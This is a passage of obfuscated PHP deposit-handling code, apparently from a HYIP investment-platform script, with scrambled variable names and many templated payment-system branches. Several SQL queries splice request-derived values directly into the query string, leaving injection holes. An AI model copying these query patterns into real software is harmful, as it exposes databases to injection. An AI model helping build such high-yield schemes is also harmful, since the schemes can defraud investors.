                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            $elnlcSWfu = $elnlcCgqPK[$elnlcsyENS['elnlcdktEr']];
                          }

                          elnlcsius ('deposit_admin_notification', $elnlcSWfu, $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                          header ('Location: ?a=deposit&say=deposit_success');
                          exit ();
                        }

                        $elnlcfhFg->assign ('ok', $elnlcwedHs);
                        $elnlcfhFg->assign ('h_id', $elnlcpazb);
                        $elnlcfhFg->assign ('amount', number_format ($elnlcrUqv, 2));
                        $elnlcfhFg->assign ('famount', $elnlcrUqv);
                        $elnlcfhFg->display ($elnlcsyENS['elnlccCIH']);
                        print base64_decode ('Cg==
');
                        elnlcnooln ($elnlcUazB);
                        exit ();
                      }
                      else
                      {
                        if (substr ($elnlcWodOE[$elnlcsyENS['elnlcsMIe']], 0, 8) == $elnlcsyENS['elnlcoisx'])
                        {
                          if ($elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlcvWoa']] == 1)
                          {
                            if ($elnlcQTTo == 0)
                            {
                              $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                              $elnlcfhFg->assign ('pid', $elnlcGxgf);
                              $elnlcfhFg->display ($elnlcsyENS['elnlcmUuS']);
                              print base64_decode ('Cg==
');
                            }
                            else
                            {
                              if ($elnlcQTTo == 1)
                              {
                                $elnlcfhFg->display ($elnlcsyENS['elnlcCaWmo']);
                              }
                              else
                              {
                                if ($elnlcQTTo == 2)
                                {
                                  $elnlcfhFg->display ($elnlcsyENS['elnlcOxeuE']);
                                }
                                else
                                {
                                  if ($elnlcQTTo == 4)
                                  {
                                    $elnlcfhFg->display ($elnlcsyENS['elnlcfUpoJ']);
                                    print base64_decode ('Cg==
');
                                  }
                                  else
                                  {
                                    if ($elnlcQTTo == 5)
                                    {
                                      $elnlcfhFg->assign ('ps', $elnlcQTTo);
                                      $elnlcfhFg->display ($elnlcsyENS['elnlcnJrR']);
                                    }
                                    else
                                    {
                                      if ($elnlcQTTo == 55)
                                      {
                                        $elnlcfhFg->assign ('ps', $elnlcQTTo);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcnJrR']);
                                      }
                                      else
                                      {
                                        if ($elnlcQTTo == 6)
                                        {
                                          $elnlcfhFg->display ($elnlcsyENS['elnlcNPAAe']);
                                          print base64_decode ('Cg==
');
                                        }
                                        else
                                        {
                                          if ($elnlcQTTo == 7)
                                          {
                                            $elnlcfhFg->display ($elnlcsyENS['elnlcCavVy']);
                                            print base64_decode ('Cg==
');
                                          }
                                          else
                                          {
                                            if ($elnlcQTTo == 8)
                                            {
                                              $elnlcfhFg->display ($elnlcsyENS['elnlceTbc']);
                                            }
                                            else
                                            {
                                              if ($elnlcQTTo == 9)
                                              {
                                                $elnlcfhFg->display ($elnlcsyENS['elnlcefEa']);
                                                print base64_decode ('Cg==
');
                                              }
                                              else
                                              {
                                                if ($elnlcQTTo == 10)
                                                {
                                                  $elnlcfhFg->display ($elnlcsyENS['elnlcKfPvd']);
                                                  print base64_decode ('Cg==
');
                                                }
                                                else
                                                {
                                                  if ($elnlcQTTo == 11)
                                                  {
                                                    $elnlcfhFg->display ($elnlcsyENS['elnlcWITk']);
                                                    print base64_decode ('Cg==
');
                                                  }
                                                  else
                                                  {
                                                    if ($elnlcQTTo == 12)
                                                    {
                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcwsvT']);
                                                      print base64_decode ('Cg==
');
                                                    }
                                                    else
                                                    {
                                                      if ($elnlcQTTo == 15)
                                                      {
                                                        $elnlcfhFg->display ($elnlcsyENS['elnlcuKlbx']);
                                                        print base64_decode ('Cg==
');
                                                      }
                                                      else
                                                      {
                                                        if ($elnlcQTTo == 16)
                                                        {
                                                          $elnlcfhFg->display ($elnlcsyENS['elnlchaJwc']);
                                                          print base64_decode ('Cg==
');
                                                        }
                                                        else
                                                        {
                                                          if ($elnlcQTTo == 17)
                                                          {
                                                            $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                            $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                            $elnlcfhFg->display ($elnlcsyENS['elnlcnlxV']);
                                                            print base64_decode ('Cg==
');
                                                          }
                                                          else
                                                          {
                                                            if ($elnlcQTTo == 18)
                                                            {
                                                              $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment', 'payment_system' => 'perfect_money'), 0);
                                                              $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                              $elnlcfhFg->display ($elnlcsyENS['elnlcMWguV']);
                                                              print base64_decode ('Cg==
');
                                                            }
                                                            else
                                                            {
                                                              if ($elnlcQTTo == 19)
                                                              {
                                                                $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                $elnlcfhFg->display ($elnlcsyENS['elnlciUJM']);
                                                                print base64_decode ('Cg==
');
                                                              }
                                                              else
                                                              {
                                                                if ($elnlcQTTo == 20)
                                                                {
                                                                  $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                  $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                  $elnlcfhFg->display ($elnlcsyENS['elnlconHWo']);
                                                                  print base64_decode ('Cg==
');
                                                                }
                                                                else
                                                                {
                                                                  if ($elnlcQTTo == 21)
                                                                  {
                                                                    $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                    $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                    $elnlcfhFg->display ($elnlcsyENS['elnlcBjpfu']);
                                                                    print base64_decode ('Cg==
');
                                                                  }
                                                                  else
                                                                  {
                                                                    if ($elnlcQTTo == 22)
                                                                    {
                                                                      $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                      $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcnahVF']);
                                                                      print base64_decode ('Cg==
');
                                                                    }
                                                                    else
                                                                    {
                                                                      if ($elnlcQTTo == 23)
                                                                      {
                                                                        $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                        $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                        $elnlcfhFg->display ($elnlcsyENS['elnlczIwho']);
                                                                        print base64_decode ('Cg==
');
                                                                      }
                                                                      else
                                                                      {
                                                                        if ($elnlcQTTo == 24)
                                                                        {
                                                                          $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment', 'payment_system' => 'evowallet'), 0);
                                                                          $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcKbeJa']);
                                                                          print base64_decode ('Cg==
');
                                                                        }
                                                                        else
                                                                        {
                                                                          if ($elnlcQTTo == 25)
                                                                          {
                                                                            $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'payment_system' => 'remitfund'), 0);
                                                                            $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                            $elnlcfhFg->display ($elnlcsyENS['elnlcVhdta']);
                                                                            print base64_decode ('Cg==
');
                                                                          }
                                                                          else
                                                                          {
                                                                            if ($elnlcQTTo == 26)
                                                                            {
                                                                              $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                              $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                              $elnlcfhFg->display ($elnlcsyENS['elnlcKbyS']);
                                                                              print base64_decode ('Cg==
');
                                                                            }
                                                                            else
                                                                            {
                                                                              if ($elnlcQTTo == 27)
                                                                              {
                                                                                $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                                $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                                $elnlcfhFg->display ($elnlcsyENS['elnlcezdi']);
                                                                                print base64_decode ('Cg==
');
                                                                              }
                                                                              else
                                                                              {
                                                                                if ($elnlcQTTo == 28)
                                                                                {
                                                                                  $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                                  $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                                  $elnlcfhFg->display ($elnlcsyENS['elnlcKVgFe']);
                                                                                  print base64_decode ('Cg==
');
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                          else
                          {
                            $elnlcwedHs = $elnlcsyENS['elnlctNxTK'];
                            $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                            $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcSzzCf']]);
                            $elnlcQTTo = substr ($elnlcWodOE[$elnlcsyENS['elnlcsMIe']], 8);
                            $elnlcLOJT = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                            if (($elnlcSuVc[use_add_funds] AND $elnlcpazb == -1))
                            {
                              if ($elnlcrUqv < 0.0100000000000000002081668)
                              {
                                $elnlcfhFg->assign ('zero_amount', 1);
                                $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                              }

                              $elnlcButH = 'Deposit to Account';
                            }
                            else
                            {
                              $q = '' . 'select * from hm2_types where id = ' . $elnlcpazb . ' and closed = 0';
                              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                              $elnlcgNwD = mysql_fetch_array ($elnlchGkPU);
                              if (!$elnlcgNwD)
                              {
                                $elnlcfhFg->assign ('wrong_plan', 1);
                              }
                              else
                              {
                                $elnlcButH = $elnlcgNwD[$elnlcsyENS['elnlcmjdk']];
                                $elnlcfhFg->assign ('plan_name', $elnlcButH);
                              }

                              $elnlcxRMia = $elnlcsyENS['elnlcmjUx'];
                              if ($elnlcgNwD[$elnlcsyENS['elnlcvNkQ']])
                              {
                                if ($elnlcgNwD[$elnlcsyENS['elnlcdzAd']] == 0)
                                {
                                  $elnlcgNwD[$elnlcsyENS['elnlcdzAd']] = $elnlcrUqv + 1;
                                }

                                if (($elnlcgNwD[$elnlcsyENS['elnlcqQISr']] <= $elnlcrUqv AND $elnlcrUqv <= $elnlcgNwD[$elnlcsyENS['elnlcdzAd']]))
                                {
                                  $elnlcxRMia = $elnlcsyENS['elnlctNxTK'];
                                  if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
                                  {
                                    $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
                                    $elnlcdALE = array ();
                                    foreach ($elnlcnGUUn as $elnlcvRHDg)
                                    {
                                      array_push ($elnlcdALE, sprintf ('%d', $elnlcvRHDg));
                                    }

                                    sort ($elnlcdALE);
                                    $elnlcqsuFJ = array ();
                                    foreach ($elnlcdALE as $elnlcvRHDg)
                                    {
                                      array_push ($elnlcqsuFJ, array ('percent' => sprintf ('%d', $elnlcvRHDg)));
                                    }

                                    $elnlcfhFg->assign ('compound_percents', $elnlcqsuFJ);
                                  }
                                  else
                                  {
                                    $elnlcfhFg->assign ('compound_min_percents', $elnlcgNwD[$elnlcsyENS['elnlcORJuw']]);
                                    $elnlcfhFg->assign ('compound_max_percents', $elnlcgNwD[$elnlcsyENS['elnlcyDBs']]);
                                  }
                                }
                              }

                              $elnlcfhFg->assign ('use_compound', $elnlcxRMia);
                              $q = '' . 'select count(*) as col, min(min_deposit) as min from hm2_plans where parent = ' . $elnlcpazb;
                              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                              $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                              if ($elnlcCgqPK)
                              {
                                if ($elnlcCgqPK[$elnlcsyENS['elnlckNCf']] == 0)
                                {
                                  $elnlcfhFg->assign ('wrong_plan', 1);
                                  $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                                }

                                if ($elnlcrUqv < $elnlcCgqPK[$elnlcsyENS['elnlcisNwx']])
                                {
                                  $elnlcfhFg->assign ('less_than_min', 1);
                                  $elnlcfhFg->assign ('min_amount', number_format ($elnlcCgqPK[$elnlcsyENS['elnlcisNwx']], 2));
                                  $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                                }
                              }
                              else
                              {
                                $elnlcfhFg->assign ('wrong_plan', 1);
                                $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                              }

                              $elnlcxdwm = $elnlcsyENS['elnlcmjUx'];
                              $q = '' . 'select min(max_deposit) as min, max(max_deposit) as max from hm2_plans where parent = ' . $elnlcpazb;
                              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                              $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                              if ($elnlcCgqPK)
                              {
                                if (0 < $elnlcCgqPK[$elnlcsyENS['elnlcisNwx']])
                                {
                                  if ($elnlcCgqPK[$elnlcsyENS['elnlcRfuvo']] < $elnlcLOJT[$elnlcsyENS['elnlceleT']])
                                  {
                                    $elnlcxdwm = $elnlcCgqPK[$elnlcsyENS['elnlcRfuvo']];
                                  }
                                }
                              }

                              if (($elnlcxdwm < $elnlcrUqv AND 0 < $elnlcxdwm))
                              {
                                $elnlcfhFg->assign ('max_deposit_less', 1);
                                $elnlcfhFg->assign ('max_deposit_format', number_format ($elnlcxdwm, 2));
                                $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                              }
                            }

                            $q = '' . 'select * from hm2_processings where id = ' . $elnlcQTTo;
                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                            $elnlcQACRu = mysql_fetch_array ($elnlchGkPU);
                            if (($elnlcwedHs == 1 AND $elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcpcHa']))
                            {
                              $elnlcRMwb = sprintf ('%.02f', $elnlcWodOE[$elnlcsyENS['elnlccdExO']]);
                              if ($elnlcxRMia)
                              {
                                if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
                                {
                                  $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
                                  if (!in_array ($elnlcRMwb, $elnlcnGUUn))
                                  {
                                    $elnlcRMwb = $elnlcnGUUn[0];
                                  }
                                }
                                else
                                {
                                  if ($elnlcRMwb < $elnlcgNwD[$elnlcsyENS['elnlcORJuw']])
                                  {
                                    $elnlcRMwb = $elnlcgNwD[$elnlcsyENS['elnlcORJuw']];
                                  }

                                  if ($elnlcgNwD[$elnlcsyENS['elnlcyDBs']] < $elnlcRMwb)
                                  {
                                    $elnlcRMwb = $elnlcgNwD[$elnlcsyENS['elnlcyDBs']];
                                  }
                                }
                              }

                              $elnlcncrs = $elnlcWodOE[$elnlcsyENS['elnlcVLuoO']];
                              $elnlcNFSm = serialize ($elnlcncrs);
                              if ($elnlcpazb == -1)
                              {
                                $elnlcpazb = $elnlcsyENS['elnlcmjUx'];
                              }

                              $q = 'insert into hm2_pending_deposits set
            user_id = \'' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . '\',
            `fields` = \'' . elnlcnczen ($elnlcNFSm) . ('' . '\',
            ec = ' . $elnlcQTTo . ',
            amount = ' . $elnlcrUqv . ',
            type_id = ' . $elnlcpazb . ',
            date = now(),
            status = \'new\',
            compound = ' . $elnlcRMwb);
                              (mysql_query ($q) OR print mysql_error ());
                              $elnlcNFSm = '';
                              $elnlcncrs = unserialize ($elnlcQACRu[$elnlcsyENS['elnlceOeM']]);
                              foreach ($elnlcncrs as $elnlckapu => $elnlciAbM)
                              {
                                $elnlcNFSm .= '' . $elnlciAbM . ': ' . $elnlcWodOE[$elnlcsyENS['elnlcVLuoO']][$elnlckapu] . '
';
                              }

                              $elnlcRuFoK = array ();
                              $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
                              $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
                              $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = number_format ($elnlcrUqv, 2);
                              $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlcmjdk']];
                              $elnlcRuFoK[$elnlcsyENS['elnlcVLuoO']] = $elnlcNFSm;
                              $elnlcRuFoK[$elnlcsyENS['elnlcwKttz']] = $elnlcButH;
                              $elnlcRuFoK[$elnlcsyENS['elnlccdExO']] = $elnlcRMwb;
                              $q = 'select date_format(now() + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour, \'%b-%e-%Y %r\') as date';
                              $elnlchGkPU = mysql_query ($q);
                              $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                              $elnlcRuFoK[$elnlcsyENS['elnlcmRJV']] = $elnlcCgqPK[$elnlcsyENS['elnlcmRJV']];
                              $q = 'select email from hm2_users where id = 1';
                              $elnlchGkPU = mysql_query ($q);
                              $elnlcVVgTd = mysql_fetch_array ($elnlchGkPU);
                              elnlcsius ('pending_deposit_admin_notification', $elnlcVVgTd[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
                              if ($elnlcpazb == 0)
                              {
                                header ('Location: ?a=add_funds&say=deposit_saved');
                              }
                              else
                              {
                                header ('Location: ?a=deposit&say=deposit_saved');
                              }
                            }

                            $elnlcRMwb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccdExO']]);
                            $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#amount#/', number_format ($elnlcrUqv, 2), $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                            $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#username#/', $elnlcgcnET[$elnlcsyENS['elnlczWew']], $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                            $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#email#/', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                            $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#id#/', $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                            $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#name#/', $elnlcgcnET[$elnlcsyENS['elnlcmjdk']], $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                            $elnlcfhFg->assign ('description', $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                            $elnlcncrs = unserialize ($elnlcQACRu[$elnlcsyENS['elnlceOeM']]);
                            $elnlcNFSm = array ();
                            foreach ($elnlcncrs as $elnlckapu => $elnlciAbM)
                            {
                              array_push ($elnlcNFSm, array ('id' => $elnlckapu, 'name' => $elnlciAbM));
                            }

                            $elnlcfhFg->assign ('fields', $elnlcNFSm);
                            $elnlcfhFg->assign ('ok', $elnlcwedHs);
                            $elnlcfhFg->assign ('h_id', $elnlcpazb);
                            $elnlcfhFg->assign ('amount', number_format ($elnlcrUqv, 2));
                            $elnlcfhFg->assign ('famount', $elnlcrUqv);
                            $elnlcfhFg->assign ('compounding', $elnlcRMwb);
                            $elnlcfhFg->assign ('ps', $elnlcQTTo);
                            $elnlcfhFg->assign ('type', $elnlcWodOE[$elnlcsyENS['elnlcsMIe']]);
                            $elnlcfhFg->assign ('cname', $elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlcmjdk']]);
                            $elnlcfhFg->display ($elnlcsyENS['elnlcwOTE']);
                            print base64_decode ('Cg==
');
                          }

                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }
                      }
                    }
                  }
                }

                $q = 'select type_id from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                $elnlcBFBSo = array ();
                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                {
                  array_push ($elnlcBFBSo, $elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]);
                }

                if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcIQlnV'])
                {
                  $q = '' . 'select * from hm2_deposits where status=\'on\' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                  ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                  $elnlciJkj = array ();
                  while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                  {
                    array_push ($elnlciJkj, $elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]);
                  }

                  $elnlchEBdB = join (', ', $elnlciJkj);
                }

                $q = 'select * from hm2_types where status = \'on\' and closed = 0 order by ordering';
                if (sizeof ($elnlciJkj) != '')
                {
                  $q = '' . 'select * from hm2_types where status = \'on\' and closed = 0 and id not in (' . $elnlchEBdB . ') order by ordering';
                }

                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                $elnlczhuc = array ();
                $i = $elnlcsyENS['elnlcmjUx'];
                $elnlcGokT = $elnlcsyENS['elnlcfGaaW'];
                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                {
                  if (0 < $elnlcCgqPK[$elnlcsyENS['elnlcbViuH']])
                  {
                    if (!in_array ($elnlcCgqPK[$elnlcsyENS['elnlcbViuH']], $elnlcBFBSo))
                    {
                      continue;
                    }
                  }

                  ++$i;
                  if (($elnlcCgqPK[$elnlcsyENS['elnlcvNkQ']] == 1 AND (($i == 1 AND $elnlcWodOE[$elnlcsyENS['elnlcSzzCf']] == '') OR $elnlcWodOE[$elnlcsyENS['elnlcSzzCf']] == $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']])))
                  {
                    $elnlcfhFg->assign ('default_check_compound', 1);
                  }

                  $elnlcwEoEI += $elnlcCgqPK[$elnlcsyENS['elnlcvNkQ']];
                  $elnlcCgqPK[$elnlcsyENS['elnlcwFTQ']] = $elnlcsyENS['elnlccnEm'];
                  $elnlcCgqPK[$elnlcsyENS['elnlcMFyGk']] = 0.000100000000000000004792174;
                  $q = 'select * from hm2_plans where parent = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . ' order by id';
                  if (!($elnlcjSNE = mysql_query ($q)))
                  {
                    exit (mysql_error ());
                    (bool)true;
                  }

                  $elnlcCgqPK[$elnlcsyENS['elnlcKBthk']] = array ();
                  while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                  {
                    $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = '';
                    $elnlcGokT = ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']] < $elnlcGokT ? $elnlcUpbus[$elnlcsyENS['elnlcwFTQ']] : $elnlcGokT);
                    if ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] == 0)
                    {
                      $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[$elnlcsyENS['elnlcypSu']] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' and more';
                    }
                    else
                    {
                      $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[$elnlcsyENS['elnlcypSu']] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' - ' . $elnlcSuVc[$elnlcsyENS['elnlcypSu']] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']]);
                    }

                    if ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']] < $elnlcCgqPK[$elnlcsyENS['elnlcwFTQ']])
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlcwFTQ']] = $elnlcUpbus[$elnlcsyENS['elnlcwFTQ']];
                    }

                    if (($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']] == 0 OR $elnlcCgqPK[$elnlcsyENS['elnlcwFTQ']] == 0))
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlcwFTQ']] = $elnlcsyENS['elnlcmjUx'];
                    }
                    else
                    {
                      if ($elnlcCgqPK[$elnlcsyENS['elnlcMFyGk']] < $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']])
                      {
                        $elnlcCgqPK[$elnlcsyENS['elnlcMFyGk']] = $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']];
                      }
                    }

                    array_push ($elnlcCgqPK[$elnlcsyENS['elnlcKBthk']], $elnlcUpbus);
                  }

                  $elnlcCgqPK[$elnlcsyENS['elnlcdryi']] = $elnlcweII[$elnlcCgqPK[$elnlcsyENS['elnlcdryi']]];
                  array_push ($elnlczhuc, $elnlcCgqPK);
                }

                $q = 'select sum(actual_amount) as sm, ec from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' group by ec';
                $elnlchGkPU = mysql_query ($q);
                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                {
                  $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcTcMv']] = number_format ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']], 2);
                }

                $elnlcQTTo = array ();
                reset ($elnlcGPfS);
                foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
                {
                  array_push ($elnlcQTTo, array_merge (array ('id' => $elnlckapu), (array)$elnlcoFEhc));
                }

                $elnlcfhFg->assign ('ps', $elnlcQTTo);
                $elnlcTmCT = array ();
                if ($elnlcSuVc[$elnlcsyENS['elnlcHrRLP']] == 1)
                {
                  $q = '' . 'select id from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                  ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                  $elnlcadsc = array ();
                  $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                  while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                  {
                    array_push ($elnlcadsc, $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]);
                  }

                  $q = 'select sum(actual_amount) as amount, ec from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and 
	deposit_id in (' . join (',', $elnlcadsc) . ') and 
			(type=\'earning\' or 
	(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\'))) group by ec';
                  ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                  while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                  {
                    array_push ($elnlcTmCT, array ('ec' => $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']], 'amount' => number_format ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']], 2)));
                  }
                }
                else
                {
                  if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                  {
                    $q = '' . 'select
              sum(hm2_history.actual_amount) as am, 
	      hm2_history.ec
            from
              hm2_history,
              hm2_deposits,
              hm2_types
            where
              hm2_history.user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and
	      hm2_history.deposit_id = hm2_deposits.id and
              hm2_types.id = hm2_deposits.type_id and
              now() - interval hm2_types.hold day < hm2_history.date and 
              hm2_deposits.deposit_date + interval hm2_types.hold day > now() and
	      (hm2_history.type=\'earning\' or 
		(hm2_history.type=\'deposit\' and (hm2_history.description like \'Compou%\' or hm2_history.description like \'<b>Archived transactions</b>:<br>Compound%\'))) 
	    group by hm2_history.ec
          ';
                  }
                  else
                  {
                    $q = '' . 'select
              sum(hm2_history.actual_amount) as am, 
	      hm2_history.ec
            from
              hm2_history,
              hm2_deposits,
              hm2_types
            where
              hm2_history.user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and
	      hm2_history.deposit_id = hm2_deposits.id and
              hm2_types.id = hm2_deposits.type_id and
              now() - interval hm2_types.hold day < hm2_history.date and 
	      (hm2_history.type=\'earning\' or 
		(hm2_history.type=\'deposit\' and (hm2_history.description like \'Compou%\' or hm2_history.description like \'<b>Archived transactions</b>:<br>Compound%\'))) 
